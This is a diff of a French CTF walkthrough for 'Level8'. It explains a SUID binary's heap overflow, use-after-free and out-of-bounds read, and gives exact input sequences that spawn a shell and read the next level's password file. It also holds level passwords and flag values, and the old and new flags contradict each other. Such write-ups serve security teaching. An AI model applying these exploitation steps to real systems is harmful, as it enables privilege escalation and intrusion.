@@ -1,40 +1,37 @@
 # Level8 - Walkthrough
 
 ## Objectif
-Exploiter un heap overflow via allocation contiguë pour modifier la zone mémoire vérifiée par la commande `login` et obtenir un shell.
+Exploiter une combinaison de heap overflow, dangling pointer et out-of-bounds read pour obtenir un shell.
+
+**Technique** : Use-After-Free + Out-of-Bounds Read
 
 ---
 
-## Étape 1 : Connexion
-```bash
-ssh level8@localhost -p 4242
-# Mot de passe : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-```
+## Étapes d'exploitation
 
----
-
-## Étape 2 : Reconnaissance
+### 1. Reconnaissance
 ```bash
 ls -la
+# -rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
+# ⚠️ Bit SUID actif → s'exécute avec les droits de level9
+
 ./level8
-# (nil), (nil)
-```
+(nil), (nil)     # Affiche auth et service
 
-Le programme affiche deux pointeurs et attend des commandes en input.
+auth test
+0x804a008, (nil)
 
-Tester les commandes :
-```bash
-auth
-service
-reset
+service admin
+0x804a008, 0x804a018
+
 login
+Password:
 ```
 
----
+Le programme attend des commandes : `auth`, `reset`, `service`, `login`.
 
-## Étape 3 : Identifier la vulnérabilité
+### 2. Analyse du code (Ghidra)
 
-Analyser le binaire dans Ghidra révèle :
 ```c
 char *auth = NULL;
 char *service = NULL;
@@ -44,113 +41,132 @@ int main(void) {
     
     while (1) {
         printf("%p, %p \n", auth, service);
-        
-        if (fgets(buffer, 128, stdin) == NULL)
-            return 0;
+        fgets(buffer, 128, stdin);
         
         // Commande "auth "
         if (strncmp(buffer, "auth ", 5) == 0) {
-            auth = malloc(4);              // Alloue seulement 4 bytes
+            auth = malloc(4);          // ⚠️ Seulement 4 bytes
             auth[0] = 0;
             if (strlen(buffer + 5) < 30) {
-                strcpy(auth, buffer + 5);
+                strcpy(auth, buffer + 5);  // ⚠️ Peut copier 29 bytes !
             }
         }
         
         // Commande "reset"
         if (strncmp(buffer, "reset", 5) == 0) {
-            free(auth);
+            free(auth);                // ⚠️ Dangling pointer !
         }
         
         // Commande "service"
         if (strncmp(buffer, "service", 7) == 0) {
-            service = strdup(buffer + 8);  // Alloue après auth
+            service = strdup(buffer + 8);
         }
         
         // Commande "login"
         if (strncmp(buffer, "login", 5) == 0) {
-            if (*(int *)(auth + 32) == 0) {      // Vérifie auth[32] !
+            if (*(int *)(auth + 32) == 0) {  // ⚠️ Out-of-bounds read !
                 fwrite("Password:\n", 1, 10, stdout);
             } else {
-                system("/bin/sh");               // Shell si != 0
+                system("/bin/sh");
             }
         }
     }
 }
 ```
 
-**La vulnérabilité :**
-- `malloc(4)` alloue seulement 4 bytes pour `auth`
-- `login` vérifie `auth[32]` (32 bytes après le début de `auth`)
-- Accès **hors limites** de la zone allouée
+**Vulnérabilités identifiées** :
+1. `malloc(4)` trop petit, peut overflow jusqu'à 29 bytes
+2. `free(auth)` sans `auth = NULL` → dangling pointer
+3. `*(int *)(auth + 32)` lit 32 bytes après auth (hors limites !)
 
----
+**Stratégie** : Faire en sorte que `auth + 32` contienne une valeur non-nulle.
 
-## Étape 4 : Analyser l'allocation heap
+### 3. Comprendre la condition
 
-Tester les commandes et observer les adresses :
+```c
+if (*(int *)(auth + 32) == 0) {
+    fwrite("Password:\n", 1, 10, stdout);
+} else {
+    system("/bin/sh");  // ← On veut arriver ici !
+}
+```
+
+**Pour le shell** : `auth + 32` doit contenir **n'importe quoi sauf 0**.
+
+### 4. Analyser le heap layout
+
+**Après `auth test`** :
+```
+0x0804a008  auth: "test\0" (4 bytes alloués)
+```
+
+**Après `service XXXXXXXXXXXXXXXXXXXXXXXXXXXX`** :
+```
+0x0804a008  auth: "test\0"
+0x0804a018  service: "XXXXXXXXXXXXXXXXXXXXXXXXXXXX\0"
+```
+
+**Calcul de `auth + 32`** :
+```
+auth = 0x0804a008
+auth + 32 = 0x0804a028
+
+service = 0x0804a018
+service[16] = 0x0804a028  ← C'est auth + 32 ! ✅
+```
+
+**Si service contient au moins 16 bytes de données**, `auth + 32` pointe DANS service !
+
+### 5. Exploitation
+
+#### Méthode 1 : Simple (sans reset)
+
 ```bash
-./level8
-(nil), (nil)
+./level8 << EOF
 auth test
-0x804a008, (nil)
-service AAAA
-0x804a008, 0x804a018
-```
-
-**Layout de la heap :**
-```
-0x804a008: [auth - 4 bytes]     ← malloc(4)
-0x804a00c: [heap metadata]      ← ~12 bytes
-0x804a018: [service - N bytes]  ← strdup(input)
-...
-0x804a028: [???]                ← auth + 32 (zone vérifiée par login)
-```
-
-**Distance à couvrir :** `0x804a028 - 0x804a018 = 0x10 = 16 bytes`
-
----
-
-## Étape 5 : Construction de l'exploit
-
-**Stratégie :**
-1. Allouer `auth` avec la commande `auth`
-2. Allouer `service` juste après avec au moins 16 caractères
-3. Les données de `service` débordent jusqu'à `auth + 32`
-4. La commande `login` vérifie `auth[32]` qui n'est plus nul → shell obtenu
-
----
-
-## Étape 6 : Exploitation
-```bash
-./level8
-auth test
-service AAAAAAAAAAAAAAAA
+service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 login
+cat /home/user/level9/.pass
+EOF
 ```
 
-Résultat : Shell obtenu !
-```bash
-cat /home/user/level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+**Explication** :
 ```
+1. auth test      → auth = 0x0804a008
+2. service XXX... → service = 0x0804a018 (après auth)
+3. login          → auth + 32 lit dans service
+                  → Valeur non-nulle → Shell ✅
+```
+
+#### Méthode 2 : Use-After-Free (avec reset)
+
 ```bash
-su level9
-# Mot de passe : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+./level8 << EOF
+auth test
+reset
+service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+login
+cat /home/user/level9/.pass
+EOF
+```
+
+**Explication** :
+```
+1. auth test  → auth = 0x0804a008
+2. reset      → free(auth), mais auth pointe toujours vers 0x0804a008
+3. service    → strdup() réalloue à 0x0804a008 (même adresse !)
+4. login      → auth + 32 lit dans service → Shell ✅
 ```
 
 ---
 
 ## Flag
 ```
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b21e5fdabf3ab11f0c2
 ```
 
----
-
 ## Type de vulnérabilité
-
-- **Heap overflow** : Débordement via allocation adjacente
-- **Out-of-bounds read** : Lecture hors limites (`auth[32]` alors que `malloc(4)`)
-
-La heap alloue la mémoire de manière contiguë. En remplissant `service` avec suffisamment de données, on écrit dans la zone que `login` vérifie, permettant de bypasser la vérification.
+- Heap-based Buffer Overflow (CWE-122)
+- Out-of-bounds Read (CWE-125)
+- Use After Free (CWE-416)
+- SUID privilege escalation (CWE-250)
